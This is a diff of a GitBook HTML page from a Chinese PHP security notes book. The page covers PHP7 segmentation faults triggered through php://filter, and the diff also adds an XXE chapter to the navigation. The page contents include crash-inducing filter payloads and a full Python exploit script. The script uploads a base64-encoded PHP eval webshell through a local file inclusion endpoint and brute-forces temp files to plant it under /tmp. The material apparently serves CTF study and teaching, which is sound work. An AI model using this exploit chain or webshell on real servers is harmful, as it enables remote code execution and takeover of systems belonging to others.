@@ -2628,6 +2628,90 @@
     
 
     
+        
+        <li class="header">漏洞类型</li>
+        
+        
+    
+        <li class="chapter " data-level="6.1" >
+            
+                <span>
+            
+                    
+                    XXE
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="6.1.1" >
+            
+                <span>
+            
+                    
+                    前置知识
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="6.1.1.1" data-path="../VUL/DTD.html">
+            
+                <a href="../VUL/DTD.html">
+            
+                    
+                    DTD
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.1.1.2" data-path="../VUL/XML.html">
+            
+                <a href="../VUL/XML.html">
+            
+                    
+                    XML
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="6.1.2" data-path="../VUL/报错XXE.html">
+            
+                <a href="../VUL/报错XXE.html">
+            
+                    
+                    报错XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
 
     <li class="divider"></li>
 
@@ -2673,66 +2757,64 @@
                                 
                                 <h2 id="segmentation-fault">Segmentation fault</h2>
 <p>&#x53C2;&#x8003;&#x6587;&#x7AE0;</p>
-<pre><code>- https://hackmd.io/s/Hk-2nUb3Q
-- https://www.jianshu.com/p/dfd049924258
-</code></pre><ol>
-<li>&#x8D85;&#x5927;&#x5B57;&#x7B26;
-&#x53C2;&#x8003;&#x4E0A;&#x9762;&#x7684;&#x6587;&#x7AE0;&#x53EF;&#x77E5;&#x4E0B;&#x5217;&#x8BED;&#x53E5;&#x53EF;&#x4EE5;&#x89E6;&#x53D1;fault&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x5728;&#x5F53;&#x65F6;&#x6BD4;&#x8D5B;&#x8FC7;&#x540E;&#x6D4B;&#x8BD5;&#x4E5F;&#x5C31;&#x662F;2018&#x5E74;&#x6D4B;&#x8BD5;(php7.2.10)&#x7684;&#x65F6;&#x5019;&#x662F;&#x53EF;&#x4EE5;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x5728;19&#x5E74;5.14&#x65E5;&#x6D4B;&#x8BD5;&#x53D1;&#x73B0;php5.6&#xFF0C;php(7.0.33,7.1.29,7.2.18,7.3,5)&#x90FD;&#x4E0D;&#x53EF;&#x4EE5;&#x4E86;&#x3002;&#x53EF;&#x80FD;&#x65F6;&#x4FEE;&#x590D;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x5B89;&#x88C5;&#x4E86;&#x65E7;&#x7248;&#x672C;&#x6CA1;&#x6709;&#x5347;&#x7EA7;(&#x5C0F;&#x672C;&#x7248;&#x53F7;&#x7801;)&#x7684;&#x8BDD;&#xFF0C;&#x5E94;&#x8BE5;&#x8FD8;&#x662F;&#x7EAF;&#x5728;&#x7684;&#x5427;&#xFF1F;
-```php</li>
-</ol>
-<p>file(urldecode(&apos;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&apos;));</p>
-<pre><code>2. strip_tags
-PHP=7.0.33
-</code></pre><p><a href="">?php
+<ul>
+<li><a href="https://hackmd.io/s/Hk-2nUb3Q" target="_blank">https://hackmd.io/s/Hk-2nUb3Q</a></li>
+<li><a href="https://www.jianshu.com/p/dfd049924258" target="_blank">https://www.jianshu.com/p/dfd049924258</a></li>
+</ul>
+<h3 id="&#x8D85;&#x5927;&#x5B57;&#x7B26;">&#x8D85;&#x5927;&#x5B57;&#x7B26;</h3>
+<p>&#x53C2;&#x8003;&#x4E0A;&#x9762;&#x7684;&#x6587;&#x7AE0;&#x53EF;&#x77E5;&#x4E0B;&#x5217;&#x8BED;&#x53E5;&#x53EF;&#x4EE5;&#x89E6;&#x53D1;fault&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x5728;&#x5F53;&#x65F6;&#x6BD4;&#x8D5B;&#x8FC7;&#x540E;&#x6D4B;&#x8BD5;&#x4E5F;&#x5C31;&#x662F;2018&#x5E74;&#x6D4B;&#x8BD5;(php7.2.10)&#x7684;&#x65F6;&#x5019;&#x662F;&#x53EF;&#x4EE5;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x5728;19&#x5E74;5.14&#x65E5;&#x6D4B;&#x8BD5;&#x53D1;&#x73B0;php5.6&#xFF0C;php(7.0.33,7.1.29,7.2.18,7.3,5)&#x90FD;&#x4E0D;&#x53EF;&#x4EE5;&#x4E86;&#x3002;&#x53EF;&#x80FD;&#x65F6;&#x4FEE;&#x590D;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x5B89;&#x88C5;&#x4E86;&#x65E7;&#x7248;&#x672C;&#x6CA1;&#x6709;&#x5347;&#x7EA7;(&#x5C0F;&#x672C;&#x7248;&#x53F7;&#x7801;)&#x7684;&#x8BDD;&#xFF0C;&#x5E94;&#x8BE5;&#x8FD8;&#x662F;&#x7EAF;&#x5728;&#x7684;&#x5427;&#xFF1F;</p>
+<pre><code class="lang-php">file(urldecode(<span class="hljs-string">&apos;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&apos;</span>));
+</code></pre>
+<h3 id="triptags">trip_tags</h3>
+<p>&#x540C;&#x4E0A;&#xFF0C;&#x4F46;&#x662F;&#x6B64;&#x65F6;&#x6D4B;&#x8BD5;&#x5728;&#x7248;&#x672C;PHP7.0.33&#x6210;&#x529F;&#x590D;&#x73B0;</p>
+<pre><code>&lt;?php
 include(&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;);
-?</a></p>
-<pre><code>
+?&gt;
+</code></pre><p>&#x4F5C;&#x8005;&#x5199;&#x7684;&#x5229;&#x7528;&#x811A;&#x672C;</p>
+<pre><code class="lang-py"><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
 
-&#x4F5C;&#x8005;&#x5199;&#x7684;&#x5229;&#x7528;&#x811A;&#x672C;
-```py
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
-import requests
-import string
-import itertools
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> string
+<span class="hljs-keyword">import</span> itertools
 
 charset = string.digits + string.letters
 
-host = &quot;192.168.43.155&quot;
-port = 80
-base_url = &quot;http://%s:%d&quot; % (host, port)
+host = <span class="hljs-string">&quot;192.168.43.155&quot;</span>
+port = <span class="hljs-number">80</span>
+base_url = <span class="hljs-string">&quot;http://%s:%d&quot;</span> % (host, port)
 
 
-def upload_file_to_include(url, file_content):
-    files = {&apos;file&apos;: (&apos;evil.jpg&apos;, file_content, &apos;image/jpeg&apos;)}
-    try:
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload_file_to_include</span><span class="hljs-params">(url, file_content)</span>:</span>
+    files = {<span class="hljs-string">&apos;file&apos;</span>: (<span class="hljs-string">&apos;evil.jpg&apos;</span>, file_content, <span class="hljs-string">&apos;image/jpeg&apos;</span>)}
+    <span class="hljs-keyword">try</span>:
         response = requests.post(url, files=files)
-    except Exception as e:
-        print e
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        <span class="hljs-keyword">print</span> e
 
 
-def generate_tmp_files():
-    webshell_content = &apos;&lt;?php eval($_REQUEST[c]);?&gt;&apos;.encode(
-        &quot;base64&quot;).strip().encode(&quot;base64&quot;).strip().encode(&quot;base64&quot;).strip()
-    file_content = &apos;&lt;?php if(file_put_contents(&quot;/tmp/ssh_session_HD89q2&quot;, base64_decode(&quot;%s&quot;))){echo &quot;flag&quot;;}?&gt;&apos; % (
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_tmp_files</span><span class="hljs-params">()</span>:</span>
+    webshell_content = <span class="hljs-string">&apos;&lt;?php eval($_REQUEST[c]);?&gt;&apos;</span>.encode(
+        <span class="hljs-string">&quot;base64&quot;</span>).strip().encode(<span class="hljs-string">&quot;base64&quot;</span>).strip().encode(<span class="hljs-string">&quot;base64&quot;</span>).strip()
+    file_content = <span class="hljs-string">&apos;&lt;?php if(file_put_contents(&quot;/tmp/ssh_session_HD89q2&quot;, base64_decode(&quot;%s&quot;))){echo &quot;flag&quot;;}?&gt;&apos;</span> % (
         webshell_content)
-    phpinfo_url = &quot;%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd&quot; % (
+    phpinfo_url = <span class="hljs-string">&quot;%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span> % (
         base_url)
-    length = 6
-    times = len(charset) ** (length / 2)
-    for i in xrange(times):
-        print &quot;[+] %d / %d&quot; % (i, times)
+    length = <span class="hljs-number">6</span>
+    times = len(charset) ** (length / <span class="hljs-number">2</span>)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(times):
+        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;[+] %d / %d&quot;</span> % (i, times)
         upload_file_to_include(phpinfo_url, file_content)
 
 
-def main():
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
     generate_tmp_files()
 
 
-if __name__ == &quot;__main__&quot;:
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
     main()
-</code></pre><pre><code>#!/usr/bin/env python
+</code></pre>
+<pre><code>#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
 import requests
@@ -2807,7 +2889,7 @@ if __name__ == &quot;__main__&quot;:
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"PHP7的2个core dumped错误","level":"2.1.1.1","depth":3,"next":{"title":"语法特性","level":"2.1.2","depth":2,"ref":"","articles":[{"title":"弱比较","level":"2.1.2.1","depth":3,"path":"PHP/弱比较.md","ref":"./PHP/弱比较.md","articles":[]},{"title":"PHP7和PHP5的区别","level":"2.1.2.2","depth":3,"path":"PHP/PHP7和PHP5的区别.md","ref":"./PHP/PHP7和PHP5的区别.md","articles":[]},{"title":"数组的数组和二维数组","level":"2.1.2.3","depth":3,"path":"PHP/数组的数组和二维数组.md","ref":"./PHP/数组的数组和二维数组.md","articles":[]},{"title":"深入理解_REQUEST数组","level":"2.1.2.4","depth":3,"path":"PHP/_REQUEST数组.md","ref":"./PHP/_REQUEST数组.md","articles":[]}]},"previous":{"title":"内核错误","level":"2.1.1","depth":2,"ref":"","articles":[{"title":"PHP7的2个core dumped错误","level":"2.1.1.1","depth":3,"path":"PHP/PHP7的2个core dumped错误.md","ref":"./PHP/PHP7的2个core dumped错误.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"PHP/PHP7的2个core dumped错误.md","mtime":"2019-05-14T13:01:31.919Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-05-23T10:30:29.183Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"PHP7的2个core dumped错误","level":"2.1.1.1","depth":3,"next":{"title":"语法特性","level":"2.1.2","depth":2,"ref":"","articles":[{"title":"弱比较","level":"2.1.2.1","depth":3,"path":"PHP/弱比较.md","ref":"./PHP/弱比较.md","articles":[]},{"title":"PHP7和PHP5的区别","level":"2.1.2.2","depth":3,"path":"PHP/PHP7和PHP5的区别.md","ref":"./PHP/PHP7和PHP5的区别.md","articles":[]},{"title":"数组的数组和二维数组","level":"2.1.2.3","depth":3,"path":"PHP/数组的数组和二维数组.md","ref":"./PHP/数组的数组和二维数组.md","articles":[]},{"title":"深入理解_REQUEST数组","level":"2.1.2.4","depth":3,"path":"PHP/_REQUEST数组.md","ref":"./PHP/_REQUEST数组.md","articles":[]}]},"previous":{"title":"内核错误","level":"2.1.1","depth":2,"ref":"","articles":[{"title":"PHP7的2个core dumped错误","level":"2.1.1.1","depth":3,"path":"PHP/PHP7的2个core dumped错误.md","ref":"./PHP/PHP7的2个core dumped错误.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"PHP/PHP7的2个core dumped错误.md","mtime":"2019-05-23T13:26:55.635Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-05-24T11:54:50.166Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
@@ -2815,6 +2897,10 @@ if __name__ == &quot;__main__&quot;:
         
     <script src="../gitbook/gitbook.js"></script>
     <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
     
         
         <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
